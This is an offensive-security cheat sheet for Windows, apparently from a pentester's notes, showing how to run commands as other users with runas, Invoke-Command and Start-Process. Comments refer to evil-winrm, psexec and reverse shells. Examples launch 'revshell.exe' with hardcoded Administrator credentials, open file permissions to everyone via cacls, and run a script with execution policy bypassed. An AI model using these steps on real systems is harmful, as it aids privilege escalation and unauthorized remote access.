## runas
```powershell
runas /user:administrator <command>
```

## invoke-command

* in remote machine, in local machine: enable-psremoting needed
```powershell
#  'invoke-command' as other users' cannot be used in winrm(evil-winrm) and psexec, but it can be used in the reverse shell that does not come from winrm(evil-winrm) and psexec
$password = ConvertTo-SecureString -force -AsPlainText "password"
$cred = New-Object System.Management.Automation.PSCredential('userA',$password)
# userA should be in "Remote Management Users" or "Administrators" localgroup
Invoke-Command -Credential $cred -ScriptBlock {<command>} -computername <machine_name/localhost>

```

## start-process

```powershell
# 'start-process as other users' cannot be used in winrm(evil-winrm) and psexec (result: "Access denied"), but it can be used in the reverse shell that does not come from winrm(evil-winrm) and psexec
$password = ConvertTo-SecureString -force -AsPlainText "password"
$cred = New-Object System.Management.Automation.PSCredential('Administrator',$password)
Start-Process -FilePath './revshell.exe' -Credential $cred

cacls te.ps1 /e /g everyone:f
cacls te.ps1 /t /e /p <username>:F # should be processed under 'cmd', but not 'powershell`

Start-Process -FilePath 'powershell' -argumentlist '-Exec Bypass ./re.ps1' -Credential $cred
```